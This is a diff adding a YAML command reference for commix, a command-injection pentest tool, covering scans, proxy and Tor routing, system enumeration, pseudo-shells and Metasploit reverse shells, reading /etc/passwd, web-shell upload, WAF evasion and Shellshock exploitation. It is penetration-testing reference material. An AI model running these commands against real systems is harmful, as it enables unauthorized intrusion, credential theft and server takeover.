@@ -1,0 +1,119 @@
+tool: commix
+tags: [web, security, pentest, exploitation, vulnerability-scanner, command-injection]
+
+actions:
+# === TARGETING & BASIC SCANNING ===
+
+ - title: commix - basic GET request scan
+   desc: |
+     Performs a basic scan on a target URL to identify command injection vulnerabilities in GET parameters.
+     The tool will automatically test all available parameters unless specified otherwise.
+     This is the most common starting point for assessing simple web forms or API endpoints.
+     It uses multiple injection techniques including results-based and blind injections.
+   command: "commix --url {{url}}"
+
+ - title: commix - scan with POST data
+   desc: |
+     Tests for command injection within the body of a POST request.
+     You should provide the data string exactly as it is sent by the browser.
+     Using the 'INJECT_HERE' string helps the tool identify the specific parameter you want to test.
+     This is ideal for testing login forms, search bars, or any data-submission interface.
+   command: "commix --url {{url}} --data='{{parameter}}=INJECT_HERE'"
+
+ - title: commix - scan using raw request file
+   desc: |
+     Loads the entire HTTP request from a text file, which is usually exported from a proxy like Burp Suite.
+     This method is highly recommended for complex requests involving specific headers, cookies, and formatting.
+     It ensures that the environment during testing matches the real-world request exactly.
+     Use this when you need to maintain a complex session or stateful interaction.
+   command: "commix -r {{request_file|request.txt}}"
+
+# === REQUEST CUSTOMIZATION ===
+
+ - title: commix - scan with cookies and headers
+   desc: |
+     Enables testing on pages that require authentication or specific session cookies.
+     You can also provide custom HTTP headers like 'X-Forwarded-For' to test for injection in logging or headers.
+     This is essential for bypassing authentication walls and testing the internal logic of a web application.
+     Make sure the session is active, as expired cookies will lead to inaccurate results.
+   command: "commix --url {{url}} --cookie='{{cookie|PHPSESSID=12345}}' --header='{{header|X-Forwarded-For: 127.0.0.1}}'"
+
+ - title: commix - scan through a proxy
+   desc: |
+     Routes all Commix traffic through a specified proxy server, such as Burp Suite or Tor.
+     This is useful for debugging the tool's payloads or for anonymizing the source of the scan.
+     The format should follow protocol://address:port (e.g., http://127.0.0.1:8080).
+     Using the --tor flag is a shortcut for routing through the local Tor service.
+   command: "commix --url {{url}} --proxy={{proxy|http://127.0.0.1:8080}}"
+
+# === ENUMERATION ===
+
+ - title: commix - system information enumeration
+   desc: |
+     Attempts to gather detailed information about the underlying operating system once an injection point is found.
+     It retrieves data such as the current user, hostname, kernel version, and architecture.
+     This command is useful for post-exploitation planning and understanding the environment's constraints.
+     Note that results depend on the privileges of the user running the web service.
+   command: "commix --url {{url}} --sys-info"
+
+ - title: commix - check for root/admin privileges
+   desc: |
+     Checks if the current user on the target system has administrative or root-level privileges.
+     This is a critical step in a penetration test to determine the potential impact of the vulnerability.
+     High privileges allow for deeper system access, such as reading password files or installing backdoors.
+     It uses logic tailored for both Linux (is-root) and Windows (is-admin) systems.
+   command: "commix --url {{url}} --is-root"
+
+# === EXPLOITATION & SHELLS ===
+
+ - title: commix - drop into pseudo-shell
+   desc: |
+     Provides an interactive command-line interface on the target system after a successful injection.
+     This pseudo-shell allows you to execute OS commands as if you had direct terminal access.
+     It is not a full TTY shell, but it simulates the experience by wrapping injections into a prompt.
+     Use this for manual exploration and local enumeration of the target server.
+   command: "commix --url {{url}} --os-shell"
+
+ - title: commix - reverse shell via Metasploit
+   desc: |
+     Automates the creation and execution of a reverse shell payload using the Metasploit Framework.
+     You must have Metasploit installed on your local machine for this feature to work properly.
+     It will attempt to bypass various restrictions to establish a stable connection back to your listener.
+     This is often the preferred method for transitioning from command injection to full system control.
+   command: "commix --url {{url}} --reverse-tcp"
+
+# === FILE OPERATIONS ===
+
+ - title: commix - read remote file
+   desc: |
+     Attempts to read the contents of a specific file from the target's filesystem using the injection vulnerability.
+     This is highly effective for stealing configuration files, source code, or sensitive system data like /etc/passwd.
+     You must provide the absolute path to the file you wish to retrieve.
+     The success of this action depends on the file permissions of the web server user.
+   command: "commix --url {{url}} --file-read={{remote_file|/etc/passwd}}"
+
+ - title: commix - upload local file to host
+   desc: |
+     Uploads a file from your local machine to a specific directory on the target server.
+     You must specify both the local source path and the remote destination path.
+     This can be used to upload web shells, scripts, or other post-exploitation tools.
+     Ensure that the destination directory is writable by the web server user.
+   command: "commix --url {{url}} --file-upload={{local_file}} --file-dest={{remote_path|/tmp/shell.php}}"
+
+# === ADVANCED DETECTION & EVASION ===
+
+ - title: commix - advanced detection level and tampering
+   desc: |
+     Increases the depth of testing by setting a higher level (up to 3) for more exhaustive injection attempts.
+     It also applies tamper scripts to modify the payloads, which helps in bypassing WAF or IPS filters.
+     Level 3 includes more time-consuming and invasive checks that might find hidden vulnerabilities.
+     Use this when basic scans fail but you strongly suspect a vulnerability exists.
+   command: "commix --url {{url}} --level=3 --tamper={{tamper_script|base64encode}}"
+
+ - title: commix - exploit Shellshock
+   desc: |
+     Specifically targets the Shellshock (CVE-2014-6271) vulnerability in web applications.
+     This module focuses on injecting payloads through HTTP headers that are often processed by vulnerable Bash versions.
+     It is particularly effective against older CGI-based web servers and legacy systems.
+     Shellshock allows for immediate and often high-privileged command execution.
+   command: "commix --url {{url}} --shellshock"
